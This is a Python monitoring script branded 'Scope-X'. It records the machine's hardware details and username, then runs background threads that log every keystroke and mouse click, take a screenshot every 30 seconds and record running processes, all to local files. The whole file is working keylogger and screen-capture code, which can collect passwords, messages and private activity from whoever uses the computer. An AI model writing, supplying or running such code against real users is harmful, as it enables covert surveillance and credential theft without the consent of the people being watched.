import time
import threading
import pyautogui
import getpass
import keyboard
import psutil
import os
from datetime import datetime
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Key, Listener as KeyboardListener
import platform
import psutil
import wmi
from pyfiglet import Figlet
def print_welcome_message():
    f = Figlet(font='slant')
    print(f.renderText('Scope-X'))
    print("Coded By Dev404 :D")
print_welcome_message()
if not os.path.exists('actions'):
    os.makedirs('actions')
def save_system_info():
    cpu_info = platform.processor()
    cpu_cores = psutil.cpu_count(logical=False) 
    cpu_logical_cores = psutil.cpu_count(logical=True)  
    cpu_freq = psutil.cpu_freq().current  
    ram_info = psutil.virtual_memory().total / (1024.0 ** 2) 
    os_info = platform.system() + " " + platform.release()
    computer = wmi.WMI()
    gpu_info = computer.Win32_VideoController()[0].Name
    username = getpass.getuser()
    windows_version = computer.Win32_OperatingSystem()[0].Version
    with open('system_info.txt', 'w') as file:
        file.write(f"CPU Brand And Generation: {cpu_info}\n")
        file.write(f"CPU Cores: {cpu_cores}\n")
        file.write(f"CPU Logical Cores: {cpu_logical_cores}\n")
        file.write(f"CPU Frequency: {cpu_freq}\n")
        file.write(f"RAM Info (MB): {ram_info}\n")
        file.write(f"OS Info: {os_info}\n")
        file.write(f"GPU Info: {gpu_info}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Windows Version: {windows_version}\n")
save_system_info()
def log_key_presses():
    def on_press(key):
        with open('actions/key_logs.txt', 'a') as file:
            file.write(f'{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")} - Key pressed: {key}\n')
    def on_release(key):
        if key == Key.esc:
            return False
    listener = KeyboardListener(on_press=on_press, on_release=on_release)
    listener.start()

def log_mouse_clicks():
    def on_click(x, y, button, pressed):
        if pressed:
            with open('actions/mouse_logs.txt', 'a') as file:
                file.write(f'{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")} - Mouse clicked at ({x}, {y}) with {button}\n')
    listener = MouseListener(on_click=on_click)
    listener.start()

def capture_screenshot():
    if not os.path.exists('screenshots'):
        os.makedirs('screenshots')
    while True:
        screenshot = pyautogui.screenshot()
        screenshot.save(f'screenshots/screenshot-{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.png')
        time.sleep(30) 

def monitor_processes():
    while True:
        with open('process_logs.txt', 'a') as file:
            for proc in psutil.process_iter(['pid', 'name', 'create_time', 'exe']):
                pid = proc.info['pid']
                name = proc.info['name']
                create_time = datetime.fromtimestamp(proc.info['create_time'])  # Corrected line
                file_location = proc.info.get('exe', '')
                uptime = datetime.now() - create_time
                file.write(f"PID: {pid}, Name: {name}, Create Time: {create_time}, File Location: {file_location}, Uptime: {uptime}\n")
        time.sleep(120)
      
screenshot_thread = threading.Thread(target=capture_screenshot)
key_logs_thread = threading.Thread(target=log_key_presses)
mouse_logs_thread = threading.Thread(target=log_mouse_clicks)
process_monitor_thread = threading.Thread(target=monitor_processes)
screenshot_thread.start()
key_logs_thread.start()
mouse_logs_thread.start()
process_monitor_thread.start()
